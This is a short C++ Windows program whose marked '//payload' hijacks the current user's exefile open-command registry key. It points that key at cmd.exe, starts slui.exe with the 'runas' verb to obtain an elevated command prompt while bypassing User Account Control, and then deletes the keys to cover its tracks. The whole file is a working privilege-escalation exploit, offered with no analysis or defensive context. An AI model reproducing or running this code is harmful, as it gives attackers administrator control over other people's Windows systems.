#include <string>
#include <Windows.h>
using namespace std;

void CreateRegistryKey(HKEY key, wstring path, wstring name);
void DeleteRegistryKey(HKEY key, wstring path, wstring name);
void SetRegistryValue(HKEY key, wstring path, wstring name, wstring value);

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes", L"exefile");
	CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile", L"shell");
	CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell", L"open");
	CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open", L"command");
	//payload
	SetRegistryValue(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open\\command", L"", L"C:\\Windows\\System32\\cmd.exe");
	ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\slui.exe", NULL, NULL, SW_SHOWNORMAL);
	Sleep(1000);
	DeleteRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell\\open", L"command");
	DeleteRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell", L"open");
	return 0;
}
void CreateRegistryKey(HKEY key, wstring path, wstring name)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		HKEY hKeyResult;
		RegCreateKeyW(hKey, name.c_str(), &hKeyResult);
		RegCloseKey(hKey);
	}
}
void DeleteRegistryKey(HKEY key, wstring path, wstring name)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegDeleteKeyW(hKey, name.c_str());
		RegCloseKey(hKey);
	}
}
void SetRegistryValue(HKEY key, wstring path, wstring name, wstring value)
{
	HKEY hKey;
	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (BYTE*)value.c_str(), ((DWORD)wcslen(value.c_str()) + 1) * sizeof(wchar_t));
		RegCloseKey(hKey);
	}
}
